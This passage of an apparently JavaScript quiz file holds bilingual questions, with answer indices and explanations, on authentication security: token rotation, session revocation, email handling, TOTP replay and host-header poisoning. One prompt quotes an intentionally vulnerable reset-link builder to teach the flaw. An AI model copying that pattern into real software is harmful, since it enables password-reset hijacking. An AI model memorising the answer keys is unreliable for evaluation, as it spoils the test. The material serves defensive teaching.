            'Xoay vòng khiến mọi refresh token thành dùng-một-lần, nên một token đã dùng lại xuất hiện nghĩa là có một bản sao đâu đó. Phần cốt yếu là bạn KHÔNG phân biệt được ai trong hai bên đang cầm mới là bên chính đáng: nếu nạn nhân refresh trước thì kẻ trộm đang đưa lên cái token cũ; nếu kẻ trộm refresh trước thì nạn nhân mới là người đưa cái cũ. Vì thế thu hồi mỗi cái token vừa đưa lên thì đúng được một nửa số lần, và nửa còn lại là trao cho kẻ trộm một phiên chạy tốt. Thu hồi cả họ thì đúng ở cả hai, và nó có một tính chất đáng nể — khi kẻ trộm thắng cuộc đua, hắn bị khoá ra ngoài bởi chính lượt refresh KẾ TIẾP CỦA NẠN NHÂN, mà không ai kịp nhận ra có gì bất ổn. Phương án 3 đi quá một bước theo cách tạo ra một cú từ chối dịch vụ: bất kỳ ai trộm hay phát lại được một refresh token đều có thể cố ý khoá chủ tài khoản ra ngoài. Hình dạng đúng là chấm dứt các phiên, nói thật với người dùng chuyện gì đã xảy ra, và mời họ đăng nhập lại. Phương án 4 vứt bỏ cơ chế, và nhớ rằng mối lo của nó là có thật nhưng thuộc về một cửa sổ ân hạn hẹp đo bằng GIÂY — ba mươi phút thì ở ngoài xa lắm. Hãy dựng theo thứ tự an toàn: xoay vòng trước, rồi bản vá phía client cho cuộc đua refresh, rồi mới tới phát hiện tái dùng, đặt dòng ghi log TRƯỚC lệnh thu hồi để bạn quan sát được nó một tuần.',
          ),
        }),

        // q23 · đáp án 0
        mcq({
          prompt: B(
            'Five events should end a session: sign-out, sign out everywhere, a password change, an account being disabled, and a role being removed. Which of them cannot wait for the access token to expire, and what handles those?',
            'Năm sự kiện phải chấm dứt một phiên: đăng xuất, đăng xuất mọi nơi, đổi mật khẩu, tài khoản bị vô hiệu hoá, và một vai trò bị gỡ. Cái nào KHÔNG chờ được tới lúc access token hết hạn, và thứ gì xử lý chúng?',
          ),
          options: [
            B(
              'Account suspension and privilege downgrade, because both mean the user must stop acting now rather than in fifteen minutes; a small denylist keyed by user with a TTL equal to the access-token lifetime blocks even tokens already in flight',
              'Vô hiệu hoá tài khoản và hạ đặc quyền, vì cả hai nghĩa là người đó phải NGỪNG hành động ngay chứ không phải sau mười lăm phút; một danh sách chặn nhỏ đánh khoá theo người dùng với TTL bằng đúng vòng đời access token chặn được cả những token đang bay giữa đường',
            ),
            B(
              'Sign-out and sign out everywhere, because a user who pressed the button expects an immediate effect; both are handled by clearing the cookie, which takes effect on the next request',
              'Đăng xuất và đăng xuất mọi nơi, vì người dùng vừa bấm nút thì mong có hiệu lực ngay; cả hai được xử lý bằng cách xoá cookie, và điều đó có hiệu lực ở request kế tiếp',
            ),
            B(
              'The password change, because the credential itself is now different; it is handled by bumping a version counter that every token is checked against on every request',
              'Việc đổi mật khẩu, vì bản thân cái tín vật giờ đã khác; nó được xử lý bằng cách tăng một bộ đếm phiên bản mà mọi token đều bị đối chiếu ở mọi request',
            ),
            B(
              'None of them, because revoking the refresh row is always sufficient: an access token that cannot be renewed is harmless by definition',
              'Không cái nào, vì thu hồi dòng refresh luôn là đủ: một access token không gia hạn được thì theo định nghĩa là vô hại',
            ),
          ],
          correct: 0,
          explanation: EX(
            'Three of the five are satisfied by revoking refresh rows and letting the window close. Sign-out and sign out everywhere are user-initiated and the user is not the threat, so "within fifteen minutes" is a promise you can state and keep. A password change is the same, with one refinement: revoke every session <em>except</em> the one performing the change. The other two are different because the person still holding the token is the reason you are acting. A suspended account that keeps working for fifteen more minutes is a suspension that did not happen, and a demoted admin with fifteen minutes of admin left is fifteen minutes of exactly the problem you were fixing. The fast path is deliberately small: one Redis key per affected user, with a TTL equal to the access-token lifetime, checked with a single <code>EXISTS</code> after the signature has already passed. It holds only a handful of keys at any moment even in a busy system, it is keyed by user rather than by token, and it may fail open — if the store is down, skip the check and log it, so the window degrades back to fifteen minutes instead of the API going down. If you find yourself adding a third reason to that list, the access-token lifetime is probably too long. Option 4 is the reasoning that leaves a disabled account working, and option 2 mistakes clearing a cookie for logging out: the row is still alive, so whoever captured that token still holds it.',
            'Ba trong năm được giải quyết bằng cách thu hồi các dòng refresh rồi để cửa sổ tự khép. Đăng xuất và đăng xuất mọi nơi là do người dùng chủ động, và người dùng không phải mối đe doạ, nên "trong vòng mười lăm phút" là một lời hứa bạn nói ra và giữ được. Đổi mật khẩu cũng vậy, thêm một tinh chỉnh: thu hồi mọi phiên TRỪ cái phiên đang thực hiện việc đổi. Hai cái còn lại thì khác, vì chính người vẫn đang cầm token mới là lý do bạn ra tay. Một tài khoản bị vô hiệu hoá mà còn chạy thêm mười lăm phút là một lần vô hiệu hoá KHÔNG XẢY RA, và một quản trị viên bị hạ quyền còn mười lăm phút quyền quản trị là mười lăm phút của đúng cái vấn đề bạn đang sửa. Đường nhanh này cố ý làm nhỏ: một khoá Redis cho mỗi người bị ảnh hưởng, TTL bằng đúng vòng đời access token, kiểm bằng một lệnh <code>EXISTS</code> SAU khi chữ ký đã qua. Ngay cả trong một hệ bận rộn nó cũng chỉ giữ vài chục khoá tại một thời điểm, nó đánh khoá theo NGƯỜI chứ không theo token, và nó được phép HỎNG THEO HƯỚNG MỞ — kho chết thì bỏ qua phép kiểm và ghi log lại, để cửa sổ tụt về mười lăm phút thay vì làm sập cả API. Nếu bạn thấy mình đang thêm lý do thứ ba vào danh sách đó, nhiều khả năng vòng đời access token đang quá dài. Phương án 4 chính là lối lập luận để một tài khoản đã bị vô hiệu hoá vẫn chạy, còn phương án 2 nhầm việc xoá cookie với việc đăng xuất: cái dòng dữ liệu vẫn sống, nên ai đã bắt được token đó thì vẫn đang cầm nó.',
          ),
        }),

        // q24 · đáp án 2
        mcq({
          prompt: B(
            'A page loads and fires ten API calls at once. The access token has just expired, so each response is a 401 and each interceptor calls the refresh endpoint. The user is thrown back to the login screen. What happened?',
            'Một trang tải xong và bắn ra mười lời gọi API cùng lúc. Access token vừa hết hạn, nên mỗi phản hồi là một 401 và mỗi bộ chặn lại gọi endpoint refresh. Người dùng bị đá về màn hình đăng nhập. Chuyện gì đã xảy ra?',
          ),
          options: [
            B(
              'The refresh endpoint rate-limited itself after the first few calls and returned 429, which the interceptor treated as an authentication failure',
              'Endpoint refresh tự giới hạn tần suất sau vài lời gọi đầu và trả về 429, thứ mà bộ chặn coi là một lỗi xác thực',
            ),
            B(
              'The ten requests raced on the database row and the transaction deadlocked, so no successor token was written and the refresh cookie was cleared',
              'Mười request tranh chấp trên cùng một dòng dữ liệu và giao dịch bị khoá chết, nên không có token kế nhiệm nào được ghi và cookie refresh bị xoá',
            ),
            B(
              'One refresh won and rotated the token; the other nine presented the now-used token, which is indistinguishable from reuse, so the whole family was revoked. Fix it with a single in-flight refresh promise per tab, a lock across tabs, and a short server-side grace window',
              'Một lượt refresh thắng và xoay token; chín lượt còn lại đưa lên cái token vừa bị đánh dấu đã dùng, thứ không phân biệt được với tái dùng, nên cả họ bị thu hồi. Cách chữa là một lời hứa refresh duy nhất đang bay mỗi tab, một cái khoá dùng chung giữa các tab, và một cửa sổ ân hạn ngắn phía máy chủ',
            ),
            B(
              'The tokens were issued with overlapping expiry times, so nine of the ten refreshes produced access tokens that were already expired on arrival',
              'Các token được cấp với thời điểm hết hạn chồng lấn, nên chín trong mười lượt refresh sinh ra những access token vừa tới nơi đã hết hạn',
            ),
          ],
          correct: 2,
          explanation: EX(
            'This is reuse detection working exactly as designed, on the wrong input. The first refresh marks the token used and issues a successor; the other nine arrive milliseconds later carrying the same now-used token, which looks identical to a thief replaying a stolen credential, so the family is revoked and everyone is signed out. It happens in one tab through ten interceptors, across tabs sharing a cookie but not a module scope, on resume from background, and on mobile where the response simply never arrived — that last one the client genuinely cannot prevent. Three fixes stack. In the client, keep a single in-flight refresh promise so nine callers await the one request, and never retry a failed refresh or refresh in response to a failed refresh. Across tabs, take a lock and <b>re-check inside it</b> — without the re-check, three tabs queue and then each refreshes in turn, which is the same race merely serialised. On the server, remember for a few seconds what a rotated token was exchanged for, and hand the same successor back instead of revoking. Keep that window short and know what it costs: for its duration a real thief also gets a working session with no alarm, which is why thirty seconds is reasonable and five minutes is not. Measure the two counters separately — grace-window hits should be low and flat, genuine reuse detections near zero.',
            'Đây là cơ chế phát hiện tái dùng chạy đúng như thiết kế, trên một đầu vào sai. Lượt refresh đầu tiên đánh dấu token đã dùng và cấp một cái kế nhiệm; chín lượt còn lại tới sau vài mili-giây mang theo đúng cái token vừa bị đánh dấu, thứ trông y hệt một kẻ trộm đang phát lại tín vật ăn cắp, nên cả họ bị thu hồi và mọi người bị đăng xuất. Nó xảy ra trong một tab qua mười bộ chặn, giữa nhiều tab dùng chung cookie mà không dùng chung phạm vi module, lúc quay lại từ chế độ nền, và trên di động nơi phản hồi đơn giản là không bao giờ tới — riêng ca cuối này thì client thật sự không ngăn được. Ba lớp chữa chồng lên nhau. Ở client, giữ một lời hứa refresh duy nhất đang bay để chín bên gọi cùng chờ đúng một request, và đừng bao giờ thử lại một lượt refresh đã hỏng hay refresh để đáp lại một lượt refresh hỏng. Giữa các tab, lấy một cái khoá và <b>KIỂM LẠI BÊN TRONG khoá đó</b> — thiếu bước kiểm lại thì ba tab xếp hàng rồi lần lượt mỗi cái tự refresh, tức là đúng cuộc đua ấy, chỉ khác là được xếp nối đuôi. Ở máy chủ, hãy nhớ trong vài giây rằng một token vừa xoay đã được đổi lấy cái gì, và trả lại đúng cái kế nhiệm đó thay vì thu hồi. Giữ cửa sổ ấy ngắn và biết rõ nó tốn gì: trong khoảng đó một kẻ trộm thật cũng nhận được một phiên chạy tốt mà không chuông nào kêu, và đó là lý do ba mươi giây thì hợp lý còn năm phút thì không. Hãy đo hai bộ đếm riêng ra — số lần chạm cửa sổ ân hạn phải thấp và phẳng, số lần phát hiện tái dùng thật phải gần bằng không.',
          ),
        }),

        /* ── Chương 6 — vòng đời tài khoản (4 câu) ─────────────────────── */

        // q25 · đáp án 1
        mcq({
          prompt: B(
            'A team stores one email column, lowercases it, and additionally strips dots and everything after a ' + c('+') + ' in the local part "so people cannot make duplicate accounts". What is right and what is wrong here?',
            'Một nhóm lưu một cột email duy nhất, hạ hết về chữ thường, và còn bỏ luôn các dấu chấm cùng mọi thứ sau dấu ' + c('+') + ' ở phần trước @ "để người ta không tạo được tài khoản trùng". Ở đây cái gì đúng và cái gì sai?',
          ),
          options: [
            B(
              'Both parts are right, and the only missing piece is a unique index on the resulting column so two concurrent registrations cannot both succeed',
              'Cả hai phần đều đúng, và chỗ duy nhất còn thiếu là một chỉ mục duy nhất trên cột kết quả để hai lượt đăng ký đồng thời không cùng thành công được',
            ),
            B(
              'Normalising is right but one column is not: keep the address as typed for sending mail and a normalised copy for lookup and uniqueness. Stripping dots and plus tags is a Gmail rule rather than an email rule, and applying it everywhere eventually merges two strangers into one account',
              'Chuẩn hoá thì đúng nhưng một cột thì không: hãy giữ địa chỉ NGUYÊN VĂN NHƯ ĐÃ GÕ để gửi thư, và một bản đã chuẩn hoá để tra cứu và bảo đảm duy nhất. Bỏ dấu chấm và phần sau dấu cộng là một luật của Gmail chứ không phải luật của email, và áp nó ở mọi nơi thì rồi sẽ gộp hai người xa lạ vào một tài khoản',
            ),
            B(
              'Both parts are wrong: an address must be stored exactly as typed, because the local part is case-sensitive by specification and any transformation risks delivering mail to the wrong mailbox',
              'Cả hai phần đều sai: một địa chỉ phải được lưu đúng nguyên văn như đã gõ, vì phần trước @ phân biệt hoa thường theo đặc tả và mọi phép biến đổi đều có nguy cơ gửi thư nhầm hộp thư',
            ),
            B(
              'Lowercasing is wrong and stripping is right, because domains are case-sensitive under DNS while alias syntax is standardised across providers',
              'Hạ chữ thường là sai còn bỏ bớt là đúng, vì tên miền phân biệt hoa thường theo DNS trong khi cú pháp bí danh đã được chuẩn hoá giữa các nhà cung cấp',
            ),
          ],
          correct: 1,
          explanation: EX(
            'Two columns, because the two jobs are different. Lookups and the uniqueness guarantee need one canonical form; delivery should use what the person typed. Normalising means trim, lowercase the domain (DNS settles that), fold the local part too — technically the receiving server may treat it as case-sensitive, but folding it and writing that decision down is far better than two accounts that differ only in capitalisation — and apply Unicode NFKC <em>before</em> lowercasing, since order matters. What must not be normalised is alias syntax. Dot-insensitivity and <code>+tag</code> handling are Gmail conventions; at another provider <code>a.b+x@host</code> is a genuinely different mailbox, possibly belonging to a different person, so stripping globally is a data breach you cause yourself. One more thing this design must handle and none of the options mention: check-then-insert loses a race, so insert first and catch the unique-constraint violation. And note the limit of normalisation — Cyrillic <code>а</code> (U+0430) renders identically to Latin <code>a</code>, and NFKC leaves both alone because they really are different letters.',
            'Hai cột, vì hai việc là khác nhau. Việc tra cứu và bảo đảm tính duy nhất cần một dạng chính tắc; việc gửi thư nên dùng đúng thứ người ta đã gõ. Chuẩn hoá nghĩa là cắt khoảng trắng, hạ tên miền về chữ thường (DNS đã chốt việc đó), gấp luôn cả phần trước @ — về lý thuyết máy chủ nhận được phép coi phần đó là phân biệt hoa thường, nhưng gấp nó lại rồi ghi quyết định ấy xuống thì tốt hơn hẳn việc có hai tài khoản chỉ khác nhau ở chữ hoa — và áp Unicode NFKC TRƯỚC khi hạ chữ thường, vì thứ tự có ý nghĩa. Thứ KHÔNG được chuẩn hoá là cú pháp bí danh. Việc bỏ qua dấu chấm và xử lý <code>+nhãn</code> là quy ước của Gmail; ở nhà cung cấp khác thì <code>a.b+x@host</code> là một hộp thư thật sự khác, có thể của một người khác, nên bỏ bớt ở mọi nơi là một vụ rò rỉ dữ liệu do chính bạn gây ra. Còn một thứ nữa thiết kế này phải xử lý mà không phương án nào nhắc tới: kiểm-rồi-chèn sẽ thua trong một cuộc đua, nên hãy chèn trước rồi bắt lỗi vi phạm ràng buộc duy nhất. Và để ý giới hạn của việc chuẩn hoá — chữ <code>а</code> Kirin (U+0430) hiện ra y hệt chữ <code>a</code> Latin, mà NFKC để yên cả hai vì chúng thật sự là hai chữ cái khác nhau.',
          ),
        }),

        // q26 · đáp án 3
        mcq({
          prompt: B(
            'Users report that their email verification links are already expired the first time they click them. The server log shows the link being fetched seconds after delivery by a client identifying itself as ' + c('Microsoft Office Existence Discovery') + '. What is the fix?',
            'Người dùng báo rằng đường dẫn xác minh email của họ đã hết hạn ngay lần bấm đầu tiên. Log máy chủ cho thấy đường dẫn bị gọi vài giây sau khi thư được gửi, bởi một client tự xưng là ' + c('Microsoft Office Existence Discovery') + '. Cách sửa là gì?',
          ),
          options: [
            B(
              'Block the scanners by user agent, since the well-known ones identify themselves and the list is short enough to maintain',
              'Chặn các bộ quét theo user agent, vì những cái nổi tiếng đều tự xưng danh và danh sách đủ ngắn để duy trì',
            ),
            B(
              'Extend the token lifetime from twenty-four hours to seven days, so the token survives the scanner and is still valid when the user arrives',
              'Kéo dài vòng đời token từ hai mươi tư giờ lên bảy ngày, để token sống sót qua bộ quét và vẫn hợp lệ khi người dùng tới nơi',
            ),
            B(
              'Require a signed-in session before the link will work, which stops any automated client that has no cookie from consuming the token',
              'Bắt buộc phải có một phiên đã đăng nhập thì đường dẫn mới chạy, việc đó chặn mọi client tự động không có cookie khỏi tiêu mất token',
            ),
            B(
              'Move the side effect off the GET: the GET only displays a page, and a POST from a button performs the verification. The cheaper alternative is to make the GET idempotent, which costs the single-use property',
              'Chuyển tác dụng phụ ra khỏi GET: GET chỉ hiển thị một trang, còn một POST từ một cái nút mới thực hiện việc xác minh. Cách rẻ hơn là làm cho GET có tính lặp-vô-hại, đổi lại mất tính dùng-một-lần',
            ),
          ],
          correct: 3,
          explanation: EX(
            'Mail security gateways and link unfurlers — Outlook Safe Links, Proofpoint, Mimecast, Slack previews — fetch every URL in a message within seconds of delivery, follow redirects, and do not run your JavaScript. If a GET consumes a single-use token, the scanner spends it and the human gets an expired link, every time, on exactly the mail providers that corporate customers use. The general rule is older than this specific problem: <b>never put a destructive or state-changing action behind a bare GET</b> — not unsubscribe, not delete, not accept-invitation, not approve. So the GET renders a page with a button, and the POST does the work. For verification specifically there is a cheaper option worth knowing: make the GET idempotent so the same token succeeds repeatedly for its lifetime. That costs the single-use property, which for verification is an acceptable trade and for password reset is not. Option 1 fails because user-agent allowlists rot within a quarter and plenty of scanners send an ordinary browser string. Option 2 leaves the scanner spending the token, just later. Option 3 breaks the common case of clicking a link on a phone that is not signed in.',
            'Các cổng bảo mật thư và các bộ xem trước đường dẫn — Outlook Safe Links, Proofpoint, Mimecast, bản xem trước của Slack — đều đi lấy MỌI URL trong một bức thư trong vòng vài giây sau khi thư tới, đi theo cả các lệnh chuyển hướng, và không chạy JavaScript của bạn. Nếu một lệnh GET tiêu mất một token dùng-một-lần thì bộ quét tiêu nó và con người nhận được một đường dẫn hết hạn, lần nào cũng vậy, và đúng ở những nhà cung cấp thư mà khách hàng doanh nghiệp đang dùng. Luật chung còn già hơn cả vấn đề cụ thể này: <b>đừng bao giờ đặt một hành động phá huỷ hay thay đổi trạng thái sau một lệnh GET trần</b> — không huỷ đăng ký, không xoá, không nhận lời mời, không phê duyệt. Vậy nên GET dựng ra một trang có cái nút, và POST mới làm việc. Riêng với việc xác minh thì có một lựa chọn rẻ hơn đáng biết: làm cho GET lặp-vô-hại để cùng một token thành công nhiều lần trong suốt vòng đời của nó. Cái giá là mất tính dùng-một-lần, thứ mà với việc xác minh thì đánh đổi được còn với việc đặt lại mật khẩu thì không. Phương án 1 hỏng vì danh sách trắng user agent mục ruỗng trong vòng một quý và rất nhiều bộ quét gửi một chuỗi trình duyệt bình thường. Phương án 2 vẫn để bộ quét tiêu mất token, chỉ là muộn hơn. Phương án 3 phá vỡ ca phổ biến nhất là bấm một đường dẫn trên cái điện thoại chưa đăng nhập.',
          ),
        }),

        // q27 · đáp án 2
        mcq({
          prompt: B(
            'A password reset mail is built with ' + c("`https://${req.headers['x-forwarded-host'] ?? req.headers.host}/reset?t=${token}`") + '. Why is this exploitable when the attacker has no access to the victim\'s mailbox, no XSS and no ability to intercept traffic?',
            'Thư đặt lại mật khẩu được dựng bằng ' + c("`https://${req.headers['x-forwarded-host'] ?? req.headers.host}/reset?t=${token}`") + '. Vì sao nó khai thác được trong khi kẻ tấn công không truy cập được hộp thư nạn nhân, không có XSS và không chặn được lưu lượng?',
          ),
          options: [
            B(
              'It is not exploitable on its own: the attacker still needs the victim to click, and a reset link is useless without the account password, so this is a hardening issue rather than a vulnerability',
              'Tự nó thì không khai thác được: kẻ tấn công vẫn cần nạn nhân bấm vào, và một đường dẫn đặt lại là vô dụng nếu không có mật khẩu tài khoản, nên đây là chuyện gia cố chứ không phải một lỗ hổng',
            ),
            B(
              'The header lets the attacker read the token directly out of the response to their own request, since the reset endpoint echoes the generated URL back to whoever called it',
              'Header này cho phép kẻ tấn công đọc thẳng cái token ra từ phản hồi của chính request của nó, vì endpoint đặt lại trả lại URL vừa sinh cho bất cứ ai gọi nó',
            ),
            B(
              'The attacker requests a reset for the victim\'s address while sending a poisoned host header; your server then mails the victim a genuine link, from your genuine domain, passing SPF and DKIM, that points at the attacker\'s host',
              'Kẻ tấn công yêu cầu đặt lại cho địa chỉ của nạn nhân trong khi gửi kèm một header host bị đầu độc; máy chủ CỦA BẠN khi đó gửi cho nạn nhân một đường dẫn THẬT, từ tên miền THẬT của bạn, qua được cả SPF lẫn DKIM, mà lại trỏ vào máy chủ của kẻ tấn công',
            ),
            B(
              'The token is placed in a query string, which leaks it through browser history and the Referer header; building the URL from a header changes nothing about that',
              'Cái token nằm trong chuỗi truy vấn, và điều đó làm nó rò ra qua lịch sử trình duyệt và header Referer; việc dựng URL từ một header không thay đổi gì về chuyện đó',
            ),
          ],
          correct: 2,
          explanation: EX(
            'The attacker only needs to know the victim\'s email address and to be able to send one HTTP request. They post to your forgot-password endpoint with the victim\'s address and a <code>Host</code> or <code>X-Forwarded-Host</code> header of their choosing. Your server generates a perfectly ordinary reset token and mails it — from your domain, with your branding, passing SPF and DKIM, arriving in the inbox rather than the spam folder, because it is a genuine message from you. The only thing wrong with it is the hostname in the link. The victim clicks, and their browser hands your token to the attacker\'s server. It does not even require a click in every setup: any image or asset the reset page loads from that host carries the token along in the <code>Referer</code>. The fix is one line — build the URL from a configured constant, never from a request header — plus a guard at the edge rejecting unknown hosts before they reach the app. Then grep the whole repository for <code>req.headers.host</code> and <code>x-forwarded-host</code>, remembering that the second is a header any client can set and most proxies pass through untouched. Option 4 names a real and separate concern, worth fixing with <code>Referrer-Policy: no-referrer</code> and <code>history.replaceState</code>, but it is not what makes this exploitable.',
            'Kẻ tấn công chỉ cần biết địa chỉ email của nạn nhân và gửi được một request HTTP. Nó gửi tới endpoint quên-mật-khẩu của bạn với địa chỉ của nạn nhân và một header <code>Host</code> hoặc <code>X-Forwarded-Host</code> do nó chọn. Máy chủ của bạn sinh ra một token đặt lại hoàn toàn bình thường rồi gửi đi — từ tên miền của bạn, mang nhận diện của bạn, qua được cả SPF lẫn DKIM, rơi vào hộp thư đến chứ không phải thư rác, bởi vì nó là một bức thư THẬT từ bạn. Thứ duy nhất sai trong đó là cái tên máy trong đường dẫn. Nạn nhân bấm vào, và trình duyệt của họ trao token của bạn cho máy chủ của kẻ tấn công. Ở nhiều cấu hình, nó thậm chí không cần một cú bấm: bất cứ hình ảnh hay tài nguyên nào mà trang đặt lại tải về từ máy chủ đó đều mang theo cái token trong <code>Referer</code>. Cách sửa gọn một dòng — dựng URL từ một hằng số cấu hình, không bao giờ từ một header của request — cộng thêm một chốt chặn ở rìa từ chối mọi host lạ trước khi chúng chạm tới ứng dụng. Rồi hãy grep cả kho mã tìm <code>req.headers.host</code> và <code>x-forwarded-host</code>, nhớ rằng cái thứ hai là một header mà client nào cũng đặt được và phần lớn proxy chuyển tiếp nguyên xi. Phương án 4 gọi tên một mối lo có thật và riêng biệt, đáng sửa bằng <code>Referrer-Policy: no-referrer</code> và <code>history.replaceState</code>, nhưng nó không phải thứ khiến chỗ này khai thác được.',
          ),
        }),

        // q28 · đáp án 0
        mcq({
          prompt: B(
            'An attacker with a live session on a borrowed laptop runs three requests: change the account email to their own address, request a password reset, redeem it. The real owner can no longer sign in or reset. Which control stops this chain, and where?',
            'Một kẻ tấn công có sẵn một phiên đang sống trên cái laptop mượn được chạy ba request: đổi email tài khoản sang địa chỉ của nó, yêu cầu đặt lại mật khẩu, dùng luôn đường dẫn đó. Chủ tài khoản thật từ đó không đăng nhập lại được và cũng không đặt lại được. Biện pháp nào chặn chuỗi này, và chặn ở đâu?',
          ),
          options: [
            B(
              'Re-authentication immediately before the email change, plus verifying the new address before switching to it, plus an undoable notice sent to the old address — the first of the three ends the chain on its own',
              'Xác thực lại NGAY TRƯỚC lúc đổi email, cộng với việc xác minh địa chỉ mới TRƯỚC khi chuyển sang nó, cộng với một thông báo có nút hoàn tác gửi tới địa chỉ CŨ — riêng cái đầu tiên đã chấm dứt chuỗi này',
            ),
            B(
              'A shorter session lifetime, since the whole chain depends on a session that outlived the user\'s presence at the machine',
              'Một vòng đời phiên ngắn hơn, vì cả chuỗi này phụ thuộc vào một phiên sống lâu hơn sự có mặt của người dùng bên cái máy',
            ),
            B(
              'A second factor on sign-in, because requiring it would have prevented the attacker from having a session on that laptop in the first place',
              'Một yếu tố thứ hai lúc đăng nhập, vì đòi hỏi nó thì ngay từ đầu kẻ tấn công đã không có phiên nào trên cái laptop đó',
            ),
            B(
              'Rate limiting the reset endpoint per account, which prevents the second and third requests from succeeding in quick succession',
              'Giới hạn tần suất endpoint đặt lại theo tài khoản, việc đó ngăn request thứ hai và thứ ba thành công liên tiếp nhanh như vậy',
            ),
          ],
          correct: 0,
          explanation: EX(
            'Three requests, no password required, and every individual step is a feature working as designed. The chain works because the email address is simultaneously the account identifier and the recovery channel, so whoever can change it owns the account. Re-authentication is the control that breaks it, and the timing is the whole point: it must be immediately before the change, not merely at the start of the session, because the attacker has a session and does not have the password. The second and third steps harden it further. Store the new address as <em>pending</em> and switch only after the new mailbox is verified, so a typo or a hostile address cannot take the account offline. Then notify the <b>old</b> address with a link that revokes the pending change, revokes every session and forces a reset, and keep that undo alive for weeks — the attacker controls the session but not the old mailbox, which is why this message is the detection mechanism rather than a courtesy. Option 3 misplaces the assumption: the session already exists, so a login-time factor never runs. Option 2 shortens the window without closing it. Option 4 slows a flow that only needs to work once. The same principle covers deletion: require re-authentication, revoke sessions at the request rather than at the purge, and mail the confirmation with the date.',
            'Ba request, không cần mật khẩu nào, và từng bước riêng lẻ đều là một tính năng chạy đúng thiết kế. Chuỗi này ăn được vì địa chỉ email vừa là ĐỊNH DANH tài khoản vừa là KÊNH KHÔI PHỤC, nên ai đổi được nó thì người đó sở hữu tài khoản. Xác thực lại là biện pháp bẻ gãy nó, và thời điểm mới là điều cốt lõi: phải ngay trước lúc đổi, chứ không phải chỉ ở đầu phiên, vì kẻ tấn công CÓ phiên và KHÔNG có mật khẩu. Bước hai và ba gia cố thêm. Hãy cất địa chỉ mới ở trạng thái CHỜ và chỉ chuyển sang sau khi hộp thư mới được xác minh, để một cú gõ nhầm hay một địa chỉ thù địch không đánh sập được tài khoản. Rồi báo cho địa chỉ CŨ kèm một đường dẫn thu hồi việc đổi đang chờ, thu hồi mọi phiên và bắt đặt lại mật khẩu, và giữ nút hoàn tác đó sống hàng tuần — kẻ tấn công điều khiển cái phiên chứ không điều khiển hộp thư cũ, và đó là lý do bức thư này là CƠ CHẾ PHÁT HIỆN chứ không phải một phép lịch sự. Phương án 3 đặt sai giả định: cái phiên đã tồn tại rồi, nên một yếu tố ở lúc đăng nhập chẳng bao giờ chạy tới. Phương án 2 rút ngắn cửa sổ mà không đóng nó. Phương án 4 làm chậm một luồng vốn chỉ cần chạy được một lần. Cùng nguyên tắc ấy áp cho việc xoá tài khoản: đòi xác thực lại, thu hồi phiên ngay lúc nhận yêu cầu chứ không phải lúc xoá thật, và gửi thư xác nhận kèm ngày tháng.',
          ),
        }),

        /* ── Chương 7 — yếu tố thứ hai và passkey (4 câu) ───────────────── */

        // q29 · đáp án 3
        mcq({
          prompt: B(
            'A TOTP verifier walks the drift window and returns ' + c('true') + ' or ' + c('false') + '. Codes are correct, the window is right, and the RFC test vectors pass. What attack does the return type leave open?',
            'Một bộ kiểm TOTP duyệt qua cửa sổ trôi rồi trả về ' + c('true') + ' hoặc ' + c('false') + '. Các mã đều đúng, cửa sổ đặt đúng, và các vector kiểm thử của RFC đều qua. Kiểu trả về đó để hở cú tấn công nào?',
          ),
          options: [
            B(
              'Brute force, because a boolean gives no way to count attempts and the rate limiter has nothing to key on',
              'Dò cạn, vì một giá trị đúng-sai không cho cách nào để đếm số lần thử và bộ giới hạn tần suất chẳng có gì để bám vào',
            ),
            B(
              'A timing attack, because returning early on a match makes the comparison take a measurably different time depending on which step matched',
              'Một cú tấn công thời gian, vì thoát sớm khi khớp làm phép so sánh mất một khoảng thời gian khác biệt đo được tuỳ theo bước nào đã khớp',
            ),
            B(
              'Clock drift, because without the step number you cannot record how far the user\'s device is off and the window can never be tuned',
              'Trôi đồng hồ, vì không có số bước thì bạn không ghi lại được thiết bị của người dùng lệch bao nhiêu và cái cửa sổ không bao giờ chỉnh được',
            ),
            B(
              'Replay: with three steps valid at once a code stays usable for up to ninety seconds, so anyone who reads it over a shoulder or off a phishing page can submit it again. Return the matching step, store it, and require the next one to be strictly greater',
              'Phát lại: với ba bước cùng hợp lệ một lúc, một mã còn dùng được tới chín mươi giây, nên ai đọc trộm qua vai hay lấy được từ một trang lừa đảo đều nộp lại nó được. Hãy trả về SỐ BƯỚC đã khớp, lưu nó lại, và đòi bước kế tiếp phải LỚN HƠN HẲN',
            ),
          ],
          correct: 3,
          explanation: EX(
            'A TOTP code is a one-time password, and a boolean throws away the only piece of information that could enforce the "one-time" part. With a window of one step either side, three codes are valid at any given moment, and each remains acceptable for up to ninety seconds — plenty for someone reading it over a shoulder, and plenty for a phishing page that relays it. The change is two lines: return the step that matched, persist it on the enrolment row, and reject anything not strictly greater. A useful diagnostic falls out of the same field — if a user consistently matches at step −1, their phone clock is slow, and you can log that instead of quietly absorbing it. Option 2 describes a real detail worth getting right, and it is why you walk the whole window rather than breaking on the first match, but it is a much smaller leak than replay. Option 1 confuses the verifier with the limiter, which counts attempts regardless of the return type. Option 3 names a consequence of the boolean rather than an attack. Two more things this verifier needs: strip spaces before comparing, because apps display <code>255 176</code> and users copy the space, and normalise the length before <code>timingSafeEqual</code>, which throws when the buffers differ.',
            'Một mã TOTP là một mật khẩu dùng một lần, và một giá trị đúng-sai vứt bỏ đúng cái mẩu thông tin duy nhất có thể cưỡng chế được phần "một lần" ấy. Với cửa sổ một bước mỗi bên thì tại bất cứ thời điểm nào cũng có ba mã hợp lệ, và mỗi mã còn được chấp nhận tới chín mươi giây — thừa cho một người đọc trộm qua vai, và thừa cho một trang lừa đảo chuyển tiếp nó. Thay đổi gọn trong hai dòng: trả về số bước đã khớp, ghi nó vào dòng đăng ký yếu tố, và từ chối mọi thứ không lớn hơn hẳn. Cùng cái trường ấy còn cho không một công cụ chẩn đoán — nếu một người dùng liên tục khớp ở bước −1 thì đồng hồ điện thoại của họ chạy chậm, và bạn ghi lại được điều đó thay vì lặng lẽ hấp thụ nó. Phương án 2 mô tả một chi tiết có thật đáng làm cho đúng, và đó là lý do phải duyệt HẾT cửa sổ chứ không thoát ở lần khớp đầu, nhưng nó là một chỗ rò nhỏ hơn hẳn so với phát lại. Phương án 1 lẫn bộ kiểm với bộ giới hạn tần suất, thứ vẫn đếm số lần thử bất kể kiểu trả về. Phương án 3 gọi tên một hệ quả của giá trị đúng-sai chứ không phải một cú tấn công. Hai thứ nữa mà bộ kiểm này cần: cắt dấu cách trước khi so, vì các app hiển thị <code>255 176</code> và người dùng chép luôn cả dấu cách, và chuẩn hoá độ dài trước khi gọi <code>timingSafeEqual</code>, thứ 